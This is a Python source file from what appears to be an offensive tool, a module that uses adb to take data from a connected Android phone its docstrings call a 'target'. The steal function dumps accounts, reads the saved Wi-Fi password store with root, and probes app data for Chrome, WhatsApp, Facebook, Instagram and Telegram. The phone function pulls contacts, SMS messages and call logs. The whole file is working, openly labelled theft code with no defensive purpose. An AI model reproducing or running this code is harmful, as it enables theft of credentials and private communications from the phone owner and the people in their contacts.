# ddsmat/adb.py
"""
adb-driven phone and steal operations.
Install: pkg install android-tools
"""
import os
import shutil
import sqlite3
import subprocess
import tempfile
from pathlib import Path


def _adb_bin():
    b = shutil.which("adb")
    if not b:
        raise RuntimeError("adb not installed — pkg install android-tools")
    return b


def _run(args, serial=None, timeout=30):
    cmd = [_adb_bin()] + (["-s", serial] if serial else []) + args
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired:
        return "(adb timeout)"
    except Exception as e:
        return f"(adb error: {e})"


def list_devices():
    out = _run(["devices"])
    devices = []
    for line in out.splitlines()[1:]:
        parts = line.strip().split()
        if len(parts) >= 2 and parts[1] == "device":
            devices.append(parts[0])
    return devices


# ------------------------------------------------------------------
def steal(serial=None):
    """Dump credentials from the adb-connected target."""
    lines = ["=== adb STEAL ==="]

    if not list_devices():
        lines.append("no adb devices attached.")
        lines.append("enable USB debugging, plug in, then: adb devices")
        lines.append("or over network: adb connect <ip>:5555")
        return "\n".join(lines)

    serial = serial or list_devices()[0]
    lines.append(f"target: {serial}")

    lines.append("\n[accounts]")
    out = _run(["shell", "dumpsys", "account"], serial=serial)
    lines.append(out[:2500])

    lines.append("\n[wifi]")
    out = _run(["shell", "su", "-c",
                "cat /data/misc/wifi/WifiConfigStore.xml"], serial=serial)
    if "No such file" in out or "Permission denied" in out or not out.strip():
        lines.append("(no root or path changed — try /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml)")
    else:
        lines.append(out[:3000])

    lines.append("\n[installed packages]")
    out = _run(["shell", "pm", "list", "packages"], serial=serial)
    lines.append(out[:2000])

    lines.append("\n[shared_prefs scan (target apps)]")
    targets = ["com.android.chrome", "com.whatsapp", "com.facebook.katana",
               "com.instagram.android", "org.telegram.messenger"]
    for pkg in targets:
        out = _run(["shell", "run-as", pkg, "ls",
                    f"/data/data/{pkg}/shared_prefs"], serial=serial, timeout=10)
        if "package not debuggable" in out or "unknown package" in out:
            continue
        if out.strip():
            lines.append(f"--- {pkg} ---")
            lines.append(out[:1200])

    return "\n".join(lines)


# ------------------------------------------------------------------
def phone(serial, what="all"):
    """Pull contacts / sms / call log from an adb-connected device."""
    lines = [f"=== adb PHONE ({what}) — {serial} ==="]

    if serial not in list_devices():
        lines.append(f"device {serial} not connected.")
        return "\n".join(lines)

    if what in ("contacts", "all"):
        lines.append("\n[CONTACTS]")
        out = _run(["shell", "content", "query",
                    "--uri", "content://com.android.contacts/data/phones",
                    "--projection", "display_name:data1"], serial=serial)
        lines.append(out[:4000] or "(none)")

    if what in ("sms", "all"):
        lines.append("\n[SMS inbox]")
        out = _run(["shell", "content", "query",
                    "--uri", "content://sms/inbox",
                    "--projection", "address:body:date"], serial=serial)
        lines.append(out[:5000] or "(none)")

    if what in ("calls", "all"):
        lines.append("\n[CALL LOG]")
        out = _run(["shell", "content", "query",
                    "--uri", "content://call_log/calls",
                    "--projection", "number:duration:type:date"], serial=serial)
        lines.append(out[:4000] or "(none)")

    return "\n".join(lines)
